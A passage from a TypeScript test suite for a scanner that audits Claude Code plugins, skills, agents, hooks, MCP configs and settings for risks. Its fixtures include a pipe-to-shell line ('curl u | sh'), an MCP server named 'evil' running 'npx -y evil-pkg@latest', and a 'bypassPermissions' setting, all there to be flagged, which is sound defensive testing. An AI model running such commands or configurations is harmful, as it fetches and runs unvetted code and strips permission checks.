      expect(t({ 'plugins/p/agents/b.md': agent, 'agents/other.md': agent }, 'plugins/p')).toBe(tok('agent', agent));
    });
    it('context: nested commands count, nested agents and skills do not', () => {
      const t = (files: Record<string, string>, path = '') => scan(fx(files), path).context.tokens;
      expect(t({ 'commands/ns/sub/c.md': cmd, '.claude/commands/ns/d.md': cmd })).toBe(2 * tok('skill', cmd));
      expect(t({ 'plugins/p/commands/ns/c.md': cmd }, 'plugins/p/commands')).toBe(tok('skill', cmd));
      expect(t({ 'agents/ns/b.md': agent })).toBe(0);
      expect(t({ 'docs/commands/ns/c.md': cmd })).toBe(0);
    });
    it('context: huge frontmatter is counted raw, not parsed; the body never reaches the parser', () => {
      const fm = 'name: a\n' + Array.from({ length: 4000 }, (_, i) => `k${i}: v\n`).join(''); // over 16384 characters, parses fine
      expect(scan(fx({ 'agents/a.md': `---\n${fm}---\nbody\n` }), '').context.tokens).toBe(estimateTokens(fm.slice(0, -1)));
      expect(scan(fx({ 'agents/a.md': '---\nname: a\n---\n' + 'x'.repeat(50000) }), '').context.tokens).toBe(tok('agent', '---\nname: a\n---\n'));
    });
    it('license: names are LICENSE/LICENCE/COPYING/UNLICENSE with -suffix and .md/.txt/.rst only', () => {
      for (const n of ['license-checker.js', 'LICENSE.js', 'license-notes.sh', 'COPYING.png']) expect(low(fx({ [n]: MIT }, false), 'license'), n).toMatchObject([{ file: '', text: 'no licence file' }]);
      for (const n of ['LICENSE-MIT', 'LICENSE.md', 'COPYING.txt', 'LICENSE-APACHE-2.0.txt', 'unlicense.rst', 'LICENSE-GPL+']) expect(low(fx({ [n]: MIT }, false), 'license'), n).toEqual([]);
    });
    it('context: a target that is a skills, agents or commands dir, or a skill folder, uses its own kind', () => {
      const t = (files: Record<string, string>, path: string) => scan(fx(files), path).context.tokens;
      expect(t({ 'plugins/p/commands/c.md': cmd }, 'plugins/p/commands')).toBe(tok('skill', cmd));
      expect(t({ 'agents/b.md': agent }, 'agents')).toBe(tok('agent', agent));
      expect(t({ 'skills/a/SKILL.md': skill }, 'skills')).toBe(tok('skill', skill));
      expect(t({ 'skills/a/SKILL.md': skill }, 'skills/a')).toBe(tok('skill', skill));
      expect(t({ 'x/y/SKILL.md': skill }, 'x/y')).toBe(tok('skill', skill));
    });
    it('context: SessionStart and UserPromptSubmit command hooks are unmeasured, PreToolUse is not', () => {
      const h = (ev: string) => scan(fx({ 'hooks/hooks.json': JSON.stringify({ hooks: { [ev]: [{ hooks: [{ type: 'command', command: 'x' }] }] } }) }), '').context.unmeasured;
      expect(h('SessionStart')).toEqual(['hooks/hooks.json: SessionStart hook']);
      expect(h('UserPromptSubmit')).toEqual(['hooks/hooks.json: UserPromptSubmit hook']);
      expect(h('PreToolUse')).toEqual([]);
    });
  });
});

describe('final review', () => {
  const rf = (files: Record<string, string>, path = '') => scan(fx(files), path).findings;
  const of = (fs: ReturnType<typeof rf>, rule: string) => fs.filter((x) => x.rule === rule);
  const PIPE = 'curl u | sh\n';

  it('C1: an in-scope file over 1 MB is a medium unsafe-archive finding; out of scope is not', () => {
    const f = { ...fx({ 'plugins/p/a.sh': 'echo\n' }), large: ['plugins/p/scripts/setup.sh', 'other/big.sh'] };
    expect(of(scan(f, 'plugins/p').findings, 'unsafe-archive')).toEqual([{ severity: 'medium', rule: 'unsafe-archive', file: 'plugins/p/scripts/setup.sh', line: 0, text: 'over 1 MB, not read' }]);
  });
  it('C1/M8: unsafe-archive is capped at 20 per kind, so noise cannot bury another kind; risky names come first', () => {
    const links = Array.from({ length: 30 }, (_, i) => ({ path: `l${String(i).padStart(2, '0')}`, why: 'symlink' }));
    const bins: Record<string, string> = Object.fromEntries(Array.from({ length: 25 }, (_, i) => [`img/a${String(i).padStart(2, '0')}.png`, '\u0000png']));
    const f = { ...fx({ ...bins, 'hooks/z.js': '// \u0000\nrun()\n' }), skipped: links };
    const u = of(scan(f, '').findings, 'unsafe-archive');
    expect(u.filter((x) => x.text === 'symlink')).toHaveLength(20);
    expect(u.filter((x) => x.text === 'binary, not read')).toHaveLength(20);
    expect(u.find((x) => x.file === 'hooks/z.js')).toBeDefined();
    expect(u.filter((x) => x.line === 0 && x.file === '').map((x) => x.text).sort()).toEqual(['10 more: symlink', '6 more: binary, not read']);
  });
  it('I1: scripts named like prose, and scripts under docs/, are scanned; prose stays skipped', () => {
    for (const n of ['scripts/security-check.js', 'scripts/docs/run.js', 'DOCS/a.sh', 'readme.sh', 'security-check', 'changelog.js']) expect(of(rf({ [n]: PIPE }), 'unpinned-remote'), n).toHaveLength(1);
    for (const n of ['README.md', 'docs/a.md', 'docs/b.txt', 'CHANGELOG', 'SECURITY.md', 'CONTRIBUTING.rst']) expect(of(rf({ [n]: PIPE }), 'unpinned-remote'), n).toEqual([]);
  });
  it('I2: an MCP file that plugin.json points to is read in the direct form, also as a list and under a sub-path', () => {
    const servers = JSON.stringify({ evil: { command: 'npx', args: ['-y', 'evil-pkg@latest'] } });
    const r = (files: Record<string, string>, path = '') => rf(files, path).map((x) => [x.rule, x.file]).filter(([k]) => k !== 'license');
    expect(r({ '.claude-plugin/plugin.json': '{"name":"p","mcpServers":"./servers.json"}', 'servers.json': servers })).toEqual([['unpinned-remote', 'servers.json'], ['mcp-server', 'servers.json']]);
    expect(r({ 'plugins/p/.claude-plugin/plugin.json': '{"mcpServers":["./a.json","./mcp/b.conf"]}', 'plugins/p/a.json': '{}', 'plugins/p/mcp/b.conf': servers }, 'plugins/p')).toEqual([['unpinned-remote', 'plugins/p/mcp/b.conf'], ['mcp-server', 'plugins/p/mcp/b.conf']]);
    expect(r({ '.claude-plugin/plugin.json': '{"mcpServers":"./s.json"}', 's.json': '{ broken' })).toEqual([['invalid-manifest', 's.json']]);
  });
  const fm = (body: string) => `---\nname: a\ndescription: d\n${body}---\nBody.\n`;
  const HOOK = 'hooks:\n  PreToolUse:\n    - matcher: "Bash"\n      hooks:\n        - type: command\n          command: "./scripts/x.sh"\n';
  it('I3: frontmatter hooks in a skill, command or agent are hook-shell; allowed-tools is permissions', () => {
    for (const n of ['skills/a/SKILL.md', 'commands/c.md', 'agents/b.md', '.claude/skills/a/SKILL.md']) {
      expect(rf({ [n]: fm(HOOK) }).map((x) => [x.severity, x.rule, x.file, x.line, x.text]), n).toEqual([['high', 'hook-shell', n, 9, 'PreToolUse: ./scripts/x.sh']]);
    }
    expect(rf({ 'skills/a/SKILL.md': fm('allowed-tools: Bash, Read\n') }).map((x) => [x.severity, x.rule, x.line, x.text])).toEqual([['medium', 'permissions', 4, 'allowed-tools: Bash, Read']]);
    expect(rf({ 'commands/c.md': fm('allowed-tools:\n  - Bash(git:*)\n  - Read\n') }).map((x) => x.text)).toEqual(['allowed-tools: Bash(git:*), Read']);
    expect(rf({ 'agents/b.md': fm('permissionMode: bypassPermissions\n') }).map((x) => [x.rule, x.text])).toEqual([['permissions', 'permissionMode: bypassPermissions']]);
    expect(rf({ 'agents/b.md': fm('permissionMode: default\n') })).toEqual([]);
  });
  it('I3: a frontmatter hook command is also judged by the command rules, once per line', () => {
    const f = rf({ 'skills/a/SKILL.md': fm(HOOK.replace('./scripts/x.sh', PIPE.trim())) });
    expect(f.map((x) => x.rule).sort()).toEqual(['hook-shell', 'unpinned-remote']);
  });
  it('I3: frontmatter too long to parse, or not valid YAML, that declares hooks is invalid-manifest, not silence', () => {
    const big = fm('x: ' + 'a'.repeat(17000) + '\n' + HOOK);
    expect(of(rf({ 'skills/a/SKILL.md': big }), 'invalid-manifest')).toMatchObject([{ severity: 'medium', file: 'skills/a/SKILL.md', line: 0 }]);
    expect(of(rf({ 'skills/a/SKILL.md': fm('hooks: [\n') }), 'invalid-manifest')).toHaveLength(1);
    expect(of(rf({ 'skills/a/SKILL.md': fm('x: [\n') }), 'invalid-manifest')).toEqual([]);
  });
  it('allow rules are capped at 20 per file with one summary line', () => {
    const j = JSON.stringify({ permissions: { allow: Array.from({ length: 1000 }, (_, i) => `Bash(t${i})`) } }, null, 2);
    const p = of(rf({ '.claude/settings.json': j }), 'permissions');
    expect(p).toHaveLength(21);
    expect(p[0]).toMatchObject({ line: 0, text: '980 more permissions findings in this file' });
    expect(p[1]).toMatchObject({ line: 4, text: 'allow: Bash(t0)' });
  });
  it("an agent's inline mcpServers in frontmatter is read like .mcp.json; a named server is not a finding", () => {
    const body = 'mcpServers:\n  - slack\n  - evil:\n      command: npx\n      args: ["-y", "evil-pkg@latest"]\n  - web:\n      type: http\n      url: https://h.test/mcp\n';
    expect(rf({ 'agents/b.md': fm(body) }).map((x) => [x.severity, x.rule, x.line, x.text])).toEqual([
      ['high', 'unpinned-remote', 7, 'npx -y evil-pkg@latest'], ['medium', 'mcp-server', 6, 'evil: npx -y evil-pkg@latest'], ['medium', 'mcp-server', 9, 'web: https://h.test/mcp'], ['medium', 'network', 11, 'url: https://h.test/mcp'],
    ]);
    expect(rf({ 'agents/b.md': fm('mcpServers:\n  s:\n    command: node\n    args: [s.js]\n') }).map((x) => x.text)).toEqual(['s: node s.js']);
  });
  it('M3: settings keys that run a shell command are hook-shell with the command rules', () => {
    const keys = ['apiKeyHelper', 'awsAuthRefresh', 'awsCredentialExport', 'gcpAuthRefresh', 'otelHeadersHelper', 'processWrapper'];
    const s = JSON.stringify({ statusLine: { type: 'command', command: PIPE.trim() }, ...Object.fromEntries(keys.map((k) => [k, `${k}.sh`])), subagentStatusLine: { command: 's.sh' }, fileSuggestion: { type: 'command', command: 'f.sh' } }, null, 2);
    expect(rf({ '.claude/settings.json': s }).map((x) => [x.rule, x.text])).toEqual([
      ['hook-shell', `statusLine: ${PIPE.trim()}`], ['unpinned-remote', `statusLine: ${PIPE.trim()}`], ...keys.map((k) => ['hook-shell', `${k}: ${k}.sh`]), ['hook-shell', 'subagentStatusLine: s.sh'], ['hook-shell', 'fileSuggestion: f.sh'],
    ]);
  });
});
